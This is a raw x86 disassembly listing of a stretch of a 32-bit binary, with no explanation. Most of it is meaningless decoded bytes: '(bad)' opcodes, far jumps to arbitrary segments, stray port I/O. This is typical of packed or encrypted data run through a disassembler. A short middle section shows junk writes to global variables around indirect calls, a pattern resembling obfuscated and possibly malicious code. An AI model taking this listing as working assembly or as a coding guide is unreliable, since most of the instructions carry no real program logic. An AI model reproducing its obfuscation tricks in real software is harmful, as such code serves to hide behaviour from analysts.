  41384d:	sub    eax,0x55c64abf
  413852:	jo     0x4138ca
  413854:	push   0xfffffff2
  413856:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413857:	cmp    edx,0x3675a3bd
  41385d:	and    DWORD PTR [ebp-0x2a],0x70
  413861:	(bad)  
  413863:	loopne 0x4138ca
  413865:	(bad)  [eax]
  413867:	pop    ebp
  413868:	fs daa 
  41386a:	stos   DWORD PTR es:[edi],eax
  41386b:	push   edx
  41386c:	cmp    DWORD PTR cs:0x577d1338,ecx
  413873:	repz in eax,dx
  413875:	pop    edx
  413876:	pop    ebp
  413877:	jge    0x41387d
  413879:	fnstcw WORD PTR [edi]
  41387b:	jo     0x41387a
  41387d:	mov    ebx,0x3f5b7393
  413882:	mov    ds:0x9487ad28,al
  413887:	dec    edx
  413888:	pushf  
  413889:	popa   
  41388a:	(bad)  
  41388b:	ins    DWORD PTR es:[edi],dx
  41388c:	adc    eax,0x27184f96
  413891:	push   edx
  413892:	push   ebp
  413893:	jmp    0xef01:0xf5cb6f69
  41389a:	lds    esi,FWORD PTR [esi+0x60b023ad]
  4138a0:	cmp    al,0x5d
  4138a2:	add    DWORD PTR [edi+0x44805aca],ebp
  4138a8:	sub    al,0xb0
  4138aa:	mov    ecx,0x7d44fa3c
  4138af:	in     al,0xc6
  4138b1:	ins    DWORD PTR es:[di],dx
  4138b3:	xchg   ebp,eax
  4138b4:	shr    BYTE PTR [edi-0x59],1
  4138b7:	sbb    eax,0x4cf91e1c
  4138bc:	jo     0x413860
  4138be:	fdivrp st(0),st
  4138c0:	rcl    DWORD PTR [ebp+0x2c],0xfb
  4138c4:	mov    edx,0xee7d765d
  4138c9:	adc    ebx,0xffffffb4
  4138cc:	sahf   
  4138cd:	sub    eax,0x12e53fed
  4138d2:	mov    al,0xab
  4138d4:	cmp    eax,0x8ecf5563
  4138d9:	xor    esp,DWORD PTR fs:[edi+0x5feba78e]
  4138e0:	jbe    0x4138e1
  4138e2:	push   0xa2c5c0eb
  4138e7:	test   eax,0x776166a4
  4138ec:	das    
  4138ed:	mov    esp,0x6cb49d31
  4138f2:	jno    0x41394b
  4138f4:	jno    0x413935
  4138f6:	mov    dh,ch
  4138f8:	mov    ds:0x67919a34,eax
  4138fd:	mov    bl,0x45
  4138ff:	lock mov esi,0x17fc5616
  413905:	not    BYTE PTR [esi]
  413907:	mov    ebp,0x818626d8
  41390c:	cmp    DWORD PTR [ecx+0x6c0b83e1],esi
  413912:	or     edi,ebp
  413914:	call   FWORD PTR [edx+0x5d72af4a]
  41391a:	mov    edi,DWORD PTR [ebx+0x789ae154]
  413920:	cdq    
  413921:	inc    edx
  413922:	adc    al,0x5f
  413924:	dec    eax
  413925:	es cs daa 
  413928:	xor    eax,0xfaacc496
  41392d:	cmp    al,0xa
  41392f:	fadd   st(4),st
  413931:	cld    
  413932:	mov    ds:0xd6d79ccf,al
  413937:	cmp    dl,cl
  413939:	push   edx
  41393a:	ss jecxz 0x4139b2
  41393d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41393e:	add    al,0x77
  413940:	jg     0x413926
  413942:	pop    es
  413943:	mov    WORD PTR [edi-0x33],ds
  413946:	mov    bl,0xf2
  413948:	out    0xb3,eax
  41394a:	daa    
  41394b:	push   cs
  41394c:	mov    WORD PTR [esi],gs
  41394e:	xlat   BYTE PTR ds:[ebx]
  41394f:	mov    DWORD PTR [ebp+0x1d],esi
  413952:	xchg   esi,eax
  413953:	retf   
  413954:	aas    
  413955:	xor    al,0x6c
  413957:	call   0x4751:0x509a5975
  41395e:	dec    esp
  41395f:	xor    DWORD PTR [esi-0x47e95ae5],edx
  413965:	inc    edx
  413966:	lahf   
  413967:	xor    al,0xc9
  413969:	xchg   edi,eax
  41396a:	push   eax
  41396b:	cmc    
  41396c:	xchg   DWORD PTR [ebp+0x33a85d49],esp
  413972:	clc    
  413973:	lods   al,BYTE PTR ds:[esi]
  413974:	test   DWORD PTR [eax],ebp
  413976:	mov    al,ds:0x24b1d0c6
  41397b:	adc    BYTE PTR gs:[ebp-0x68d8ca45],dh
  413982:	aas    
  413983:	inc    ebp
  413984:	pop    esp
  413985:	pop    ebx
  413986:	rcr    BYTE PTR [edx-0x509f23ec],1
  41398c:	add    esp,DWORD PTR [edi+0x34]
  41398f:	pop    sp
  413991:	fwait
  413992:	xor    eax,edi
  413994:	mov    dl,0xa0
  413996:	jnp    0x4139ca
  413998:	push   0xc8387cf1
  41399d:	push   esi
  41399e:	mov    al,ds:0xbff0b5a9
  4139a3:	jo     0x4139c9
  4139a5:	dec    ecx
  4139a6:	lods   al,BYTE PTR ds:[esi]
  4139a7:	push   ebx
  4139a8:	push   edx
  4139a9:	retf   0xce46
  4139ac:	stos   DWORD PTR es:[edi],eax
  4139ad:	sahf   
  4139ae:	pusha  
  4139af:	aaa    
  4139b0:	sbb    DWORD PTR [edi+0x2a],edi
  4139b3:	xor    DWORD PTR [edi-0x20912165],0xffffffb6
  4139ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139bb:	aam    0x75
  4139bd:	and    DWORD PTR [ebp-0x38],ebp
  4139c0:	imul   ecx,eax,0x34
  4139c3:	xor    BYTE PTR [ecx-0x58423191],0x3c
  4139ca:	sti    
  4139cb:	int3   
  4139cc:	shl    ah,1
  4139ce:	daa    
  4139cf:	inc    BYTE PTR [edx-0x53517611]
  4139d5:	inc    edx
  4139d6:	mov    dh,0xbd
  4139d8:	aaa    
  4139d9:	stos   BYTE PTR es:[edi],al
  4139da:	push   0x5a291a10
  4139df:	(bad)  
  4139e0:	loopne 0x4139df
  4139e2:	inc    ebx
  4139e3:	aam    0xa5
  4139e5:	lds    ecx,FWORD PTR [edi]
  4139e7:	call   0x55145330
  4139ec:	jo     0x4139bf
  4139ee:	mov    ss,WORD PTR [ecx-0x49]
  4139f1:	ds push edi
  4139f3:	mov    ah,dl
  4139f5:	inc    ebp
  4139f6:	add    ebx,0x4a
  4139f9:	fldcw  WORD PTR [ecx-0x6c8ca0e0]
  4139ff:	je     0x413a0a
  413a01:	adc    al,0x3
  413a03:	mov    ecx,0x45501c5c
  413a08:	dec    edi
  413a09:	push   edi
  413a0a:	out    dx,eax
  413a0b:	call   FWORD PTR [edi+eiz*4+0xc]
  413a0f:	fst    QWORD PTR [esi-0x40]
  413a12:	test   BYTE PTR [eax+0x5c],cl
  413a15:	jl     0x4139ca
  413a17:	fcmovne st,st(4)
  413a19:	jbe    0x413a64
  413a1b:	ss (bad) 
  413a1d:	cdq    
  413a1e:	mov    esp,edi
  413a20:	pop    esi
  413a21:	sbb    edi,ebp
  413a23:	arpl   WORD PTR [ecx+0xb],di
  413a26:	mov    ecx,0xecb2a04
  413a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a2c:	loop   0x413a9b
  413a2e:	add    al,0x15
  413a30:	mov    al,0x8d
  413a32:	and    edi,DWORD PTR [ecx+edx*8-0x4db22815]
  413a39:	inc    ecx
  413a3a:	pusha  
  413a3b:	inc    esi
  413a3c:	mov    bl,cl
  413a3e:	mov    al,ds:0x96716a0b
  413a43:	stc    
  413a44:	and    edx,DWORD PTR [edi]
  413a46:	mov    ch,0x85
  413a48:	mov    BYTE PTR [ebx],cl
  413a4a:	std    
  413a4b:	ret    
  413a4c:	sub    esp,DWORD PTR [ecx+eax*2]
  413a4f:	sub    dl,dl
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	sbb    ebp,0x687ef3a3
  413a6d:	jo     0x413adf
  413a6f:	mov    ecx,0x5570707e
  413a74:	out    dx,eax
  413a75:	xor    bl,BYTE PTR [ebx-0x18f375b9]
  413a7b:	xchg   ecx,eax
  413a7c:	sti    
  413a7d:	cdq    
  413a7e:	loop   0x413ad0
  413a80:	push   0x68
  413a82:	and    DWORD PTR [ebx+0x6a1d7685],0xffffff82
  413a89:	cdq    
  413a8a:	push   ds
  413a8b:	fs ds lock int 0xb6
  413a90:	xor    ebx,ecx
  413a92:	pop    esp
  413a93:	cld    
  413a94:	stos   DWORD PTR es:[edi],eax
  413a95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a96:	scas   eax,DWORD PTR es:[edi]
  413a97:	mov    ebp,0xa3392d5c
  413a9c:	scas   al,BYTE PTR es:[edi]
  413a9d:	dec    esp
  413a9e:	or     DWORD PTR [esi+0x5f4196cd],eax
  413aa4:	mov    cl,0x77
  413aa6:	mov    ds:0xd4dcf8b8,eax
  413aab:	ss inc edx
  413aad:	call   0x4220a03c
  413ab2:	ins    BYTE PTR es:[edi],dx
  413ab3:	call   0x60af0d7a
  413ab8:	cmp    al,0xba
  413aba:	mul    BYTE PTR [eax-0x13018644]
  413ac0:	mov    edx,0xc6a09db
  413ac5:	and    ch,cl
  413ac7:	add    dh,dl
  413ac9:	les    edi,FWORD PTR [eax]
  413acb:	outs   dx,BYTE PTR ds:[esi]
  413acc:	(bad)  
  413acd:	pop    es
  413ace:	std    
  413acf:	cmc    
  413ad0:	fidiv  WORD PTR [eax]
  413ad3:	xchg   ebp,eax
  413ad4:	mov    al,bh
  413ad6:	pushf  
  413ad7:	pop    edi
  413ad8:	sbb    esi,0xfe26d4d1
  413ade:	xlat   BYTE PTR ds:[ebx]
  413adf:	cli    
  413ae0:	sub    edi,DWORD PTR [edi-0x55]
  413ae3:	and    BYTE PTR [ecx],dh
  413ae5:	sub    BYTE PTR [eax+0x40179c6d],0x1a
  413aec:	out    0x13,al
  413aee:	pushf  
  413aef:	packssdw mm4,QWORD PTR [esi-0x50]
  413af3:	je     0x413b1d
  413af5:	stos   BYTE PTR es:[edi],al
  413af6:	pop    es
  413af7:	inc    edi
  413af8:	push   esi
  413af9:	test   BYTE PTR [ebp+0x296a209c],cl
  413aff:	scas   eax,DWORD PTR es:[edi]
  413b00:	pop    es
  413b01:	mov    al,ds:0xe0c8ae51
  413b06:	mov    ds:0x7f517509,al
  413b0b:	ins    DWORD PTR es:[edi],dx
  413b0c:	push   ds
  413b0d:	popa   
  413b0e:	mov    ch,0x20
  413b10:	and    BYTE PTR [ebx+0x327b1ba],ch
  413b16:	jl     0x413ab0
  413b18:	cmp    BYTE PTR [ecx-0x5f],dh
  413b1b:	popf   
  413b1c:	push   0x27bc4368
  413b21:	repz pop ds
  413b23:	fisub  WORD PTR [esi-0x3aaa450f]
  413b29:	mov    edi,0x8853c757
  413b2e:	sub    al,0x70
  413b30:	lods   al,BYTE PTR ds:[esi]
  413b31:	cmp    DWORD PTR [edi],ebx
  413b33:	xchg   esi,eax
  413b34:	sub    DWORD PTR [esi+ebx*4+0x330c4471],ebx
  413b3b:	mov    ch,0x1c
  413b3d:	mov    ebp,esp
  413b3f:	fdivr  DWORD PTR [ebx-0x57]
  413b42:	test   BYTE PTR [edx],ah
  413b44:	sahf   
  413b45:	jno    0x413afa
  413b47:	pop    esi
  413b48:	jne    0x413b13
  413b4a:	or     cl,BYTE PTR [ebx-0x13d98804]
  413b50:	stos   BYTE PTR es:[edi],al
  413b51:	sub    esi,DWORD PTR [esi]
  413b53:	mov    cs,edx
  413b55:	sbb    edi,esi
  413b57:	jns    0x413b5d
  413b59:	and    ch,al
  413b5b:	inc    edx
  413b5c:	retf   
  413b5d:	in     eax,0xc6
  413b5f:	mov    al,0x65
  413b61:	or     al,0xfc
  413b63:	xchg   esp,eax
  413b64:	cmp    ah,dh
  413b66:	xchg   cl,cl
  413b68:	cmp    BYTE PTR [eax-0x4df80fdb],al
  413b6e:	clc    
  413b6f:	add    edi,DWORD PTR [edx+edx*4+0x5d]
  413b73:	call   0x29988261
  413b78:	xor    ecx,esp
  413b7a:	ret    0xe4f5
  413b7d:	jbe    0x413b55
  413b7f:	mov    ch,0x46
  413b81:	push   esi
  413b82:	jmp    0xe2e3:0xb00ab685
  413b89:	mov    gs:0x884b7a6e,al
  413b8f:	pop    ds
  413b90:	xor    DWORD PTR [ecx+0x78],0xb4b840f4
  413b97:	sub    dl,bh
  413b99:	call   0xc388b28
  413b9e:	pop    eax
  413b9f:	fcomp  DWORD PTR [edx-0x25057db2]
  413ba5:	sbb    ebx,ebp
  413ba7:	enter  0x5978,0x1b
  413bab:	mov    dh,BYTE PTR [eax-0x44e2087b]
  413bb1:	rcl    bh,1
  413bb3:	shl    ch,1
  413bb5:	or     DWORD PTR [edi-0x10],esp
  413bb8:	cmp    dh,BYTE PTR [ebp-0x2]
  413bbb:	adc    eax,0x64fa126
  413bc0:	jmp    0xaeaf:0x727d6b8e
  413bc7:	adc    eax,0xcbf82e49
  413bcc:	call   0x95bda7e1
  413bd1:	sub    al,0x14
  413bd3:	stos   DWORD PTR es:[edi],eax
  413bd4:	sbb    cl,BYTE PTR [eax-0x10]
  413bd7:	pop    DWORD PTR [ebx+0x2a82695]
  413bdd:	mov    bl,BYTE PTR [edx-0x1e]
  413be0:	push   es
  413be1:	jno    0x413c11
  413be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413be4:	adc    BYTE PTR [ecx+0x6185410f],bl
  413bea:	push   edi
  413beb:	mov    ss,WORD PTR [eax-0x3f]
  413bee:	push   ebx
  413bef:	and    edi,DWORD PTR ds:0xe4c0d547
  413bf5:	test   dh,ah
  413bf7:	pop    eax
  413bf8:	push   es
  413bf9:	test   eax,0x89596744
  413bfe:	xchg   BYTE PTR [edx],ch
  413c00:	cmp    bh,BYTE PTR [edi-0x3329c975]
  413c06:	outs   dx,BYTE PTR ds:[esi]
  413c07:	sub    BYTE PTR [ebx+ebp*4],ah
  413c0a:	pop    ds
  413c0b:	test   ebp,eax
  413c0d:	xor    ebx,DWORD PTR [edx]
  413c0f:	mov    ebx,0x6e732c54
  413c14:	mov    ebx,0xe9f16fef
  413c19:	out    0x60,al
  413c1b:	mov    eax,ds:0x53fcc8b3
  413c20:	mov    bl,0xde
  413c22:	mov    ds:0x24d46965,eax
  413c27:	mov    cl,0x34
  413c29:	not    DWORD PTR [ebx]
  413c2b:	jge    0x413beb
  413c2d:	in     al,0xcd
  413c2f:	mov    ah,bl
  413c31:	jmp    0xd0e1:0xbead34e0
  413c38:	mov    bl,0xc7
  413c3a:	jno    0x413c72
  413c3c:	jmp    0x413c19
  413c3e:	jmp    0x413c64
  413c40:	into   
  413c41:	test   ebp,esp
  413c43:	adc    BYTE PTR [edx-0x6b],0x9
  413c47:	sub    DWORD PTR ds:0xbe8f26b2,0x78
  413c4e:	or     eax,0x291eceee
  413c53:	out    0xa1,eax
  413c55:	push   ss
  413c56:	xchg   ecx,eax
  413c57:	xchg   esp,eax
  413c58:	sbb    DWORD PTR [edi],esi
  413c5a:	loop   0x413c06
  413c5c:	rcr    DWORD PTR [eax-0xb],1
  413c5f:	mov    esp,0xe8bba0a2
  413c64:	mov    edi,0x573bf361
  413c69:	sbb    al,al
  413c6b:	enter  0xc968,0x2a
  413c6f:	push   ebx
  413c70:	dec    eax
  413c71:	mov    dl,ah
  413c73:	xchg   esi,eax
  413c74:	jns    0x413c81
  413c76:	js     0x413c53
  413c78:	pop    ebx
  413c79:	gs fdivr DWORD PTR fs:[edi-0x20705262]
  413c81:	jl     0x413c4c
  413c83:	in     al,dx
  413c84:	jp     0x413c1c
  413c86:	and    BYTE PTR [esi+eax*8],dh
  413c89:	lahf   
  413c8a:	xchg   ecx,eax
  413c8b:	cli    
  413c8c:	je     0x413c43
  413c8e:	icebp  
  413c8f:	sahf   
  413c90:	mov    dl,0xd
  413c92:	sub    eax,0x39d7dd1b
  413c97:	fild   WORD PTR [eax]
  413c99:	xchg   esi,eax
  413c9a:	cwde   
  413c9b:	pop    ebp
  413c9c:	adc    BYTE PTR [ecx],ah
  413c9e:	das    
  413c9f:	sub    eax,0x25f310f6
  413ca4:	cmp    edi,DWORD PTR [eax]
  413ca6:	cmp    ecx,esp
  413ca8:	jmp    0x3f19b22b
  413cad:	test   al,0x13
  413caf:	cmp    BYTE PTR gs:[ecx+0x3104ea6c],0x62
  413cb7:	idiv   DWORD PTR [edi+edi*4]
  413cba:	mov    dl,dl
  413cbc:	mov    dh,0xf8
  413cbe:	xor    al,0xf
  413cc0:	dec    ebx
  413cc1:	fldenv [ebp-0x79]
  413cc4:	(bad)  
  413cc5:	jl     0x413c92
  413cc7:	sub    eax,0xebf032e3
  413ccc:	cmp    DWORD PTR [ebx-0x49],esp
  413ccf:	push   0xffffff86
  413cd1:	in     eax,dx
  413cd2:	cli    
  413cd3:	jge    0x413d06
  413cd5:	pop    ecx
  413cd6:	retf   
  413cd7:	inc    ecx
  413cd8:	and    al,0x84
  413cda:	or     BYTE PTR fs:[edi],ch
  413cdd:	in     al,0x1d
  413cdf:	stos   DWORD PTR es:[edi],eax
  413ce0:	bnd js 0x413ca7
  413ce3:	shl    BYTE PTR [esi],0xdf
  413ce6:	pop    ebp
  413ce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ce8:	pop    edi
  413ce9:	ins    BYTE PTR es:[edi],dx
  413cea:	fiadd  DWORD PTR [ebp-0x247e3467]
  413cf0:	fcmove st,st(4)
  413cf2:	sbb    al,0xee
  413cf4:	out    0x51,eax
  413cf6:	das    
  413cf7:	mov    BYTE PTR cs:[ecx+ebx*2-0x70548bb5],bl
  413cff:	out    dx,al
  413d00:	int    0x38
  413d02:	dec    esp
  413d03:	adc    esi,ecx
  413d05:	std    
  413d06:	fnsave ds:0xd537b204
  413d0c:	jno    0x413d1b
  413d0e:	imul   esp,ebp,0x18
  413d11:	aad    0x7d
  413d13:	xor    DWORD PTR [esi+0x49],ebx
  413d16:	dec    edi
  413d17:	inc    eax
  413d18:	dec    ebx
  413d19:	sub    al,0x20
  413d1b:	(bad)  
  413d1c:	(bad)  
  413d1e:	popa   
  413d1f:	mov    ds:0xe5ed1e40,eax
  413d24:	pop    edx
  413d25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d26:	pushf  
  413d27:	cdq    
  413d28:	jp     0x413cb2
  413d2a:	sbb    cl,0x5b
  413d2d:	retf   0x3150
  413d30:	sbb    DWORD PTR [edi],esi
  413d32:	scas   al,BYTE PTR es:[edi]
  413d33:	fwait
  413d34:	inc    esi
  413d35:	sbb    BYTE PTR [eax],al
  413d37:	or     edi,DWORD PTR [eax]
  413d39:	or     ecx,DWORD PTR [ecx+0x458be045]
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	mov    edx,0x47dc97c3
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413ed1
  413e98:	(bad)  
  413e99:	pop    ebp
  413e9a:	dec    eax
  413e9b:	add    DWORD PTR [ecx],ebp
  413e9d:	wbinvd 
  413e9f:	imul   ecx,DWORD PTR ds:0x7c23acd0,0x22
  413ea6:	into   
  413ea7:	ror    al,1
  413ea9:	jle    0x413ed3
  413eab:	cld    
  413eac:	gs retf 0x68a0
  413eb0:	mov    al,ds:0xae5d0103
  413eb5:	mov    esi,0x915d53f
  413eba:	sub    eax,0xf9dcdc29
  413ebf:	pusha  
  413ec0:	xchg   ebp,eax
  413ec1:	mov    esp,0x23f4b4c3
  413ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ec7:	daa    
  413ec8:	push   0x6ef2d198
  413ecd:	mov    dl,0x21
  413ecf:	mov    esp,0x1ce0021
  413ed4:	and    ebp,DWORD PTR [edx+0x77]
  413ed7:	lds    edx,FWORD PTR [ecx+esi*2-0x21]
  413edb:	sub    eax,0x871789cb
  413ee0:	scas   eax,DWORD PTR es:[edi]
  413ee1:	jb     0x413f4c
  413ee3:	push   ecx
  413ee4:	addr16 mov ch,0x3f
  413ee7:	test   al,0x8c
  413ee9:	loope  0x413e75
  413eeb:	lds    esi,FWORD PTR [esi+0x43]
  413eee:	sbb    BYTE PTR [ecx-0x38bf0d46],bh
  413ef4:	shl    DWORD PTR [eax+0x50255fac],cl
  413efa:	push   ebp
  413efc:	jmp    0xa84a76b3
  413f01:	mov    dl,0xc0
  413f03:	pop    ecx
  413f04:	push   eax
  413f05:	jne    0x413ec1
  413f07:	or     BYTE PTR [esi-0x2fc5bf51],0x1f
  413f0e:	xor    ecx,edi
  413f10:	mov    ch,0x99
  413f13:	dec    DWORD PTR [ebp-0x1f7f9ea7]
  413f19:	fld    st(4)
  413f1b:	add    ebp,ecx
  413f1d:	lea    ebx,[esi-0x59]
  413f20:	fwait
  413f21:	adc    dh,BYTE PTR [ecx+0x364a6b7d]
  413f27:	out    dx,eax
  413f28:	rep lods eax,DWORD PTR ds:[esi]
  413f2a:	push   eax
  413f2b:	add    BYTE PTR [edi-0x3c3e0edf],dl
  413f31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f32:	sub    BYTE PTR [edx+0x56],ch
  413f35:	pushf  
  413f36:	fstp   TBYTE PTR [ecx+0x801d843]
  413f3c:	mov    al,0x90
  413f3e:	clc    
  413f3f:	sbb    cl,bl
  413f41:	mov    BYTE PTR [ebx+0xd0fa56d],0x37
  413f48:	and    DWORD PTR [edi+0x38],0x7c695b4c
  413f4f:	xchg   ebp,eax
  413f50:	out    dx,al
  413f51:	mov    al,ds:0x3b79ae6e
  413f56:	lds    esi,FWORD PTR [esi]
  413f58:	sub    BYTE PTR [ecx],ch
  413f5a:	dec    esp
  413f5b:	or     eax,0x6a6a2a63
  413f60:	xor    BYTE PTR [esi-0x7e1bdd21],ah
  413f66:	cmp    edi,DWORD PTR [ebx-0xeeb8079]
  413f6c:	clc    
  413f6d:	xchg   edx,eax
  413f6e:	ret    0xe4d5
  413f71:	data16 out dx,al
  413f73:	xchg   BYTE PTR [ebx-0x16],ah
  413f76:	fidiv  DWORD PTR [edi+eiz*1-0x3e]
  413f7a:	jae    0x413fdb
  413f7c:	pop    eax
  413f7d:	adc    ebx,ebx
  413f7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f80:	pusha  
  413f81:	call   0xe465:0x7d1e49bd
  413f88:	inc    ebp
  413f89:	fcomp  DWORD PTR [edx-0x69]
  413f8c:	xor    esi,esi
  413f8e:	call   0x5cb2:0x9ca07489
  413f95:	push   ebx
  413f96:	ret    
  413f97:	mov    bh,0x5b
  413f99:	inc    ecx
  413f9a:	inc    ebp
  413f9b:	push   0xda47b168
  413fa0:	dec    eax
  413fa1:	push   ecx
  413fa2:	pusha  
  413fa3:	and    DWORD PTR [ebp-0x6d],edi
  413fa6:	repz ret 
  413fa8:	sbb    DWORD PTR [ebp+0x34],esp
  413fab:	test   esp,eax
  413fad:	popf   
  413fae:	mov    edi,0x8e2e93bd
  413fb3:	mov    dl,0x5c
  413fb5:	push   ss
  413fb6:	mov    al,ds:0xd1fa1a81
  413fbb:	shr    DWORD PTR [eax-0x54],cl
  413fbe:	add    ebp,DWORD PTR [ebx-0x32]
  413fc1:	neg    ebx
  413fc3:	push   ds
  413fc4:	sbb    al,0x76
  413fc6:	mov    ch,0xb
  413fc8:	in     al,dx
  413fc9:	jecxz  0x41403c
  413fcb:	inc    ebp
  413fcc:	icebp  
  413fcd:	jecxz  0x41401d
  413fcf:	jmp    0x60b2:0x8dbf1fa3
  413fd6:	ja     0x413feb
  413fd8:	fsubr  QWORD PTR [edi+0x2f5f8fa5]
  413fde:	sub    BYTE PTR [ebx+0x2],cl
  413fe1:	jno    0x413f84
  413fe3:	jns    0x414063
  413fe5:	add    ebx,edx
  413fe7:	push   0xffffffdc
  413fe9:	sbb    al,0x98
  413feb:	pop    ecx
  413fec:	xor    al,0x27
  413fee:	push   eax
  413fef:	jno    0x414030
  413ff1:	pop    edx
  413ff2:	xchg   ecx,eax
  413ff3:	pop    esi
  413ff4:	ret    
  413ff5:	fwait
  413ff6:	dec    eax
  413ff7:	icebp  
  413ff8:	mov    esp,ebx
  413ffa:	and    ah,BYTE PTR [eax-0x65]
  413ffd:	push   ecx
  413ffe:	add    eax,0xfcb88adf
  414003:	in     eax,dx
  414004:	out    dx,eax
  414005:	mov    dl,0x8b
  414007:	jae    0x41401c
  414009:	iret   
  41400a:	add    DWORD PTR [edx+0x0],ebp
  41400d:	pop    eax
  41400e:	dec    eax
  41400f:	aam    0x75
  414011:	jecxz  0x41401a
  414013:	lds    eax,FWORD PTR [edx+0x3a]
  414016:	pop    ebx
  414017:	push   eax
  414018:	leave  
  414019:	xchg   ecx,eax
  41401a:	test   dh,dh
  41401c:	leave  
  41401d:	jno    0x41400f
  41401f:	or     DWORD PTR [ebx-0x19],esi
  414022:	or     al,0xa5
  414024:	int3   
  414025:	pop    es
  414026:	jmp    0x78ef3d24
  41402b:	(bad)  
  41402c:	jns    0x414076
  41402e:	loop   0x4140ae
  414030:	add    BYTE PTR [edi+0x15],0x2b
  414034:	xor    eax,esp
  414036:	xchg   ecx,eax
  414037:	cdq    
  414038:	nop
  414039:	mov    dh,BYTE PTR [esi+0x10d00900]
  41403f:	sbb    cl,BYTE PTR [ebp+0x2ccd9db1]
  414045:	add    ch,BYTE PTR [ecx]
  414047:	cmp    edx,DWORD PTR [ebp+0x64a209d4]
  41404d:	jle    0x414039
  41404f:	push   ds
  414050:	imul   ebp,edi,0xffffffec
  414053:	shl    eax,0x87
  414056:	iret   
  414057:	ror    DWORD PTR [eax],cl
  414059:	mov    ecx,0xd32ee493
  41405e:	mov    cl,BYTE PTR [eax-0x6e]
  414061:	pop    ss
  414062:	cmc    
  414063:	frstor [esi-0x603f7e23]
  414069:	and    bl,BYTE PTR [esi-0x28d02a3b]
  41406f:	push   es
  414070:	cmp    dl,BYTE PTR [edx]
  414072:	scas   al,BYTE PTR es:[edi]
  414073:	addr16 (bad) 
  414076:	test   ecx,edi
  414078:	out    0xb1,eax
  41407a:	test   BYTE PTR [ebx-0x30],dl
  41407d:	pusha  
  41407e:	add    eax,0x3eb0300d
  414083:	iret   
  414084:	inc    edx
  414085:	sahf   
  414086:	push   es
  414087:	or     edx,DWORD PTR [edi]
  414089:	not    DWORD PTR [eax+ebp*2+0x1d6e4605]
  414090:	(bad)  
  414091:	dec    ebp
  414092:	dec    eax
  414093:	sub    al,0x83
  414095:	mov    ds:0x9fd49b3a,eax
  41409a:	xlat   BYTE PTR ds:[ebx]
  41409b:	jmp    0x812fa2ff
  4140a0:	in     al,0x9f
  4140a2:	retf   0xdb79
